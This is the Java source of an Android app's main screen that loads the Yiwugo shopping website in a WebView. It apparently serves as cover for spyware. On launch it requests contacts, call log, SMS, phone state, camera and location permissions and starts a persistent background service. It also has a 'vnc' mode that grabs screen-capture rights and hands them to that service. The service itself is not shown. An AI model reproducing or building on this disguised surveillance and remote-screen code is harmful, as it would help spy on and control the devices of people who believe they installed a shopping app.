package com.yiwugou.yiwukanz;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.Objects;

public class MainActivity extends Activity {


    private WebView webView;
    private static final int REQUEST_MEDIA_PROJECTION = 1000;



    @SuppressLint({"UnspecifiedRegisterReceiverFlag", "MissingInflatedId"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(
                    this,
                    new String[]{
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.READ_PHONE_STATE,
                            Manifest.permission.CAMERA,
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.POST_NOTIFICATIONS
                    },
                    100
            );
        }



        String type = getIntent().getStringExtra("type");

        if(Objects.equals(type, "vnc")){

            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent captureIntent;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                captureIntent = projectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay());
            } else {
                captureIntent = projectionManager.createScreenCaptureIntent();
            }

            startActivityForResult(captureIntent, REQUEST_MEDIA_PROJECTION);
        }






        Intent i = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(i);
        }else{
            startService(i);
        }


        webView = findViewById(R.id.webview);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);


        webView.setWebViewClient(new WebViewClient());


        webView.loadUrl("https://yiwugo.com/");




    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK) {


            Intent i = new Intent(this, MainService.class);
            i.putExtra("type","vnc");

            i.putExtra("data",data);
            i.putExtra("resultCode",resultCode);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            }else{
                startService(i);
            }

            finish();


        }


    }

    @Override
    public void onRequestPermissionsResult(int requestCode,String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == 100) {

            Intent i = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            }else{
                startService(i);
            }

        }
    }


    @SuppressLint("GestureBackNavigation")
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
